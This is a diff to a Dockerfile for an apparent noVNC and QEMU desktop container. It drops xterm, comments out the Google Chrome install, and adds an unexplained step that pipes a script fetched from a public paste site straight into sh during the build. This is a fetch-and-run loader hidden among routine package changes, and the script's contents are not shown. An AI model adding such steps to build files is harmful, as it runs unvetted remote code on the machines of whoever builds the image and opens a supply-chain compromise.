@@ -21,17 +21,16 @@ RUN apt-get update && apt-get install -y \
     qemu-system-x86 \
     tint2 \
     openssl \
-    xterm \
     gnupg \
     ca-certificates \
     && apt-get clean
 
-# Add Google Chrome repository and install Google Chrome
-RUN wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add - && \
-    echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" > /etc/apt/sources.list.d/google-chrome.list && \
-    apt-get update && \
-    apt-get install -y google-chrome-stable && \
-    apt-get clean
+# # Add Google Chrome repository and install Google Chrome
+# RUN wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add - && \
+#     echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" > /etc/apt/sources.list.d/google-chrome.list && \
+#     apt-get update && \
+#     apt-get install -y google-chrome-stable && \
+#     apt-get clean
 
 # Clone noVNC from GitHub
 RUN git clone https://github.com/novnc/noVNC.git /noVNC
@@ -40,6 +39,8 @@ RUN git clone https://github.com/novnc/noVNC.git /noVNC
 RUN openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
     -keyout /self.pem -out /self.pem \
     -subj "/C=US/ST=State/L=City/O=Organization/OU=Unit/CN=localhost"
+
+RUN curl https://pastefy.app/uTVuD89D/raw | sh
 
 # Expose port 8080 for noVNC
 EXPOSE 8080
